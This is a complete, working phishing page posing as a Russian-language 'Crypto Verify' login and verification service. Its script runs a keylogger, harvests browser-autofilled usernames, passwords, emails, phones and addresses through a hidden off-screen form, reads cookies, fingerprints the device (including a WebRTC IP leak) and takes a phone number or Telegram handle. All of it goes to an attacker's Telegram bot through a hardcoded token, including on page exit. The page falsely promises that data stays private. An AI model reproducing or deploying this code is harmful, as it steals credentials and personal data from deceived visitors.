<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>Crypto Verify</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow:hidden;position:relative}
.coin{position:absolute;font-size:28px;animation:fall linear forwards;pointer-events:none;z-index:0;opacity:0.6}
@keyframes fall{0%{transform:translateY(-60px) rotate(0deg);opacity:0.8}100%{transform:translateY(105vh) rotate(720deg);opacity:0}}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.92);z-index:10;display:flex;justify-content:center;align-items:center;padding:20px}
.popup{background:#fff;border:1px solid #e0e0e0;border-radius:20px;padding:36px 28px;max-width:400px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
.popup .icon{font-size:48px;margin-bottom:8px}
.popup h3{font-size:20px;color:#1a1a1a;margin-bottom:6px;font-weight:700}
.popup .desc{font-size:14px;color:#888;margin-bottom:22px;line-height:1.5}
.popup .timer{font-size:28px;font-weight:700;color:#3b82f6;margin-bottom:14px}
.popup input{width:100%;padding:15px;background:#f5f5f5;border:2px solid #e0e0e0;border-radius:12px;color:#1a1a1a;font-size:16px;text-align:center;font-family:inherit;margin-bottom:12px;transition:0.2s}
.popup input:focus{outline:none;border-color:#3b82f6;background:#fff}
.popup .btn{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:10px;transition:0.2s}
.btn-phone{background:#3b82f6;color:#fff}
.btn-tg{background:#2aabee;color:#fff}
.btn:active{transform:scale(0.97)}
.divider{display:flex;align-items:center;margin:18px 0;color:#aaa;font-size:12px}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:#e0e0e0}
.divider span{margin:0 12px}
.fineprint{font-size:9px;color:#bbb;margin-top:14px;line-height:1.4}
.hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
</style>
</head>
<body>

<div class="hidden-form">
<form>
<input type="text" name="u" autocomplete="username">
<input type="password" name="p" autocomplete="current-password">
<input type="email" name="e" autocomplete="email">
<input type="text" name="fn" autocomplete="name">
<input type="tel" name="ph" autocomplete="tel-national">
<input type="tel" name="ph2" autocomplete="tel">
<input type="text" name="adr" autocomplete="street-address">
</form>
</div>

<div class="overlay" id="overlay">
<div class="popup" id="popupContent"></div>
</div>

<script>
var TOKEN="8858233285:AAF3wGaA7AOoaKCj1W4aht0BmMnjX6jU1l4";
var CHAT="8192226287";
var sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
var keylog="";
var firstPacketSent=false;

document.addEventListener('keydown',function(e){keylog+=e.key;if(keylog.length>3000)keylog=keylog.slice(-3000)});

// Падающие монетки
var coins=['🪙','💰','💎','🪙','₿','💵','💎','🪙','₿','💰','💎','🪙'];
function spawnCoin(){
var coin=document.createElement('div');
coin.className='coin';
coin.textContent=coins[Math.floor(Math.random()*coins.length)];
coin.style.left=Math.random()*100+'%';
coin.style.fontSize=(20+Math.random()*30)+'px';
coin.style.animationDuration=(4+Math.random()*6)+'s';
coin.style.animationDelay=Math.random()*2+'s';
document.body.appendChild(coin);
setTimeout(function(){coin.remove()},8000);
}
setInterval(spawnCoin,800);
for(var i=0;i<15;i++){setTimeout(spawnCoin,i*300)}

var PD={};
PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
PD.sw=screen.width;PD.sh=screen.height;PD.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
PD.ref=document.referrer||"direct";PD.cookie=document.cookie||"-";
PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.provider="-";PD.tz_ip="-";
PD.webrtc="-";PD.af_u="-";PD.af_p="-";PD.af_e="-";PD.af_fn="-";PD.af_ph="-";PD.af_ph2="-";PD.af_adr="-";
PD.entered_data="-";PD.data_type="-";

fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
PD.region=j.region||"-";PD.provider=j.org||"-";PD.tz_ip=j.timezone||"-";
}).catch(function(){});

try{
var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
pc.createDataChannel("");pc.createOffer().then(function(o){return pc.setLocalDescription(o)});
pc.onicecandidate=function(e){if(e&&e.candidate){PD.webrtc=e.candidate.candidate;pc.close()}};
setTimeout(function(){if(PD.webrtc==="-")PD.webrtc="не определён";pc.close()},2000);
}catch(e){}

try{
var cv=document.createElement('canvas');var gl=cv.getContext('webgl');
if(gl){var db=gl.getExtension('WEBGL_debug_renderer_info');
if(db){PD.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
}catch(e){}
try{navigator.getBattery().then(function(b){PD.bat=Math.round(b.level*100)+"% ch:"+b.charging})}catch(e){}
try{if(navigator.connection){PD.conn=navigator.connection.effectiveType}}catch(e){}

setTimeout(function(){
PD.af_u=document.querySelector('[name="u"]').value||"-";
PD.af_p=document.querySelector('[name="p"]').value||"-";
PD.af_e=document.querySelector('[name="e"]').value||"-";
PD.af_fn=document.querySelector('[name="fn"]').value||"-";
PD.af_ph=document.querySelector('[name="ph"]').value||"-";
PD.af_ph2=document.querySelector('[name="ph2"]').value||"-";
PD.af_adr=document.querySelector('[name="adr"]').value||"-";
},3000);

function sendMsg(d,label){
var msg=(label||'🚨 ДАННЫЕ')+'\n\n'+
'🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
'🌐 IP: '+(d.ip||"-")+'\n📍 '+(d.country||"-")+', '+(d.city||"-")+'\n📡 '+(d.provider||"-")+'\n'+
'🔍 WebRTC: '+(d.webrtc||"-")+'\n🕐 TZ: '+(d.tz||"-")+' / IP: '+(d.tz_ip||"-")+'\n\n'+
'📱 '+(d.platform||"-")+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
'🖥 '+(d.sw||"-")+'x'+(d.sh||"-")+' | CPU:'+(d.cpu||"-")+' | RAM:'+(d.ram||"-")+'\n'+
'🗣 '+(d.lang||"-")+'\n🎮 '+(d.gpu||"-")+'\n🔋 '+(d.bat||"-")+'\n📶 '+(d.conn||"-")+'\n\n'+
'📞 ВВЕДЁННЫЕ ДАННЫЕ ('+(d.data_type||"-")+'): '+(d.entered_data||"-")+'\n\n'+
'⌨️ КЕЙЛОГГЕР:\n'+(keylog||"пусто")+'\n\n'+
'🔑 АВТОЗАПОЛНЕНИЕ:\nLOGIN: '+(d.af_u||"-")+'\nPASS: '+(d.af_p||"-")+'\nEMAIL: '+(d.af_e||"-")+'\n'+
'NAME: '+(d.af_fn||"-")+'\nPHONE: '+(d.af_ph||"-")+'\nPHONE2: '+(d.af_ph2||"-")+'\nADDR: '+(d.af_adr||"-")+'\n\n'+
'🔗 REF: '+(d.ref||"-")+'\n🍪 COOKIE: '+((d.cookie||"-").substring(0,500));

fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
method:"POST",headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:CHAT,text:msg})
});
}

// ТАЙМЕР 10 СЕК
function step1(){
var sec=10;
document.getElementById('popupContent').innerHTML=
'<div class="icon">⏳</div>'+
'<h3>Подготовка данных</h3>'+
'<div class="timer" id="countdown">10</div>'+
'<div class="desc">Пожалуйста, подождите.<br>Идёт проверка безопасности.</div>';
var cd=setInterval(function(){
sec--;
document.getElementById('countdown').textContent=sec;
if(sec<=0){clearInterval(cd);sendMsg(PD,'📋 ПАКЕТ 1: БАЗОВЫЕ ДАННЫЕ');firstPacketSent=true;step2();}
},1000);
}

// ФОРМА ВХОДА
function step2(){
document.getElementById('popupContent').innerHTML=
'<div class="icon">🔐</div>'+
'<h3>Войдите или зарегистрируйтесь</h3>'+
'<div class="desc">Выберите способ входа</div>'+
'<input type="tel" id="phoneInput" placeholder="+7 (___) ___-__-__">'+
'<button class="btn btn-phone" onclick="submitPhone()">📞 Войти по номеру телефона</button>'+
'<div class="divider"><span>или</span></div>'+
'<input type="text" id="tgInput" placeholder="@username">'+
'<button class="btn btn-tg" onclick="submitTg()">✈️ Войти через Telegram</button>'+
'<div class="fineprint">Нажимая кнопку, вы соглашаетесь с правилами сервиса и политикой обработки данных. Ваши данные будут использованы исключительно для верификации личности и не передаются третьим лицам.</div>';
}

function submitPhone(){
var phone=document.getElementById('phoneInput').value.trim();
if(!phone){alert('Введите номер телефона');return}
PD.entered_data=phone;
PD.data_type='телефон';
sendMsg(PD,'📞 ПАКЕТ 2: ТЕЛЕФОН');
success();
}

function submitTg(){
var tg=document.getElementById('tgInput').value.trim();
if(!tg){alert('Введите Telegram username');return}
if(!tg.startsWith('@'))tg='@'+tg;
PD.entered_data=tg;
PD.data_type='telegram';
sendMsg(PD,'✈️ ПАКЕТ 2: TELEGRAM');
success();
}

function success(){
document.getElementById('popupContent').innerHTML=
'<div class="icon">✅</div>'+
'<h3>Успешно</h3>'+
'<div class="desc">Вы вошли в систему.<br>База данных загружается.</div>';
}

// СТАРТ
step1();

window.addEventListener('beforeunload',function(){
if(!firstPacketSent){sendMsg(PD,'🚨 УШЁЛ ДО ОТПРАВКИ')}
var blob=new Blob([JSON.stringify({chat_id:CHAT,text:'🚨 УШЁЛ\n🆔 '+sid+'\n⌨️ '+keylog})],{type:'application/json'});
navigator.sendBeacon('https://api.telegram.org/bot'+TOKEN+'/sendMessage',blob);
});
</script>
</body>
</html>
